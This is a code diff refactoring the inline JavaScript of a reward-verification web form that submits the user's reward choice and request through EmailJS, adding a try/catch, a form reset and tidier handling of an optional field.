@@ -123,7 +123,9 @@ required>
 
 <label>Select Reward</label>
 
-<select id="reward" required>
+<select
+id="reward"
+required>
 
 <option value="">
 Choose Reward
@@ -159,7 +161,6 @@ Submit Verification
 
 <script>
 
-/* ✅ YOUR PUBLIC KEY */
 emailjs.init("IlZtBG2WOaqIrvb3T");
 
 document
@@ -168,9 +169,17 @@ document
 
 e.preventDefault();
 
-/* ✅ TEST TEMPLATE PARAMS */
+let requestValue = "None";
+
 const requestElement =
 document.getElementById('request');
+
+if(requestElement){
+
+requestValue =
+requestElement.value;
+
+}
 
 const templateParams = {
 
@@ -193,16 +202,15 @@ reward:
 document.getElementById('reward').value,
 
 request:
-requestElement
-? requestElement.value
-: "None",
+requestValue,
 
 photo:
 "Image Uploaded"
 
 };
 
-/* ✅ YOUR SERVICE + TEMPLATE IDs */
+try{
+
 await emailjs.send(
 
 "service_03gi2v9",
@@ -217,14 +225,18 @@ alert(
 "Verification submitted successfully!"
 );
 
+document
+.getElementById('rewardForm')
+.reset();
+
 }
 catch(error){
+
+console.log(error);
 
 alert(
 JSON.stringify(error)
 );
-
-console.log(error);
 
 }
 
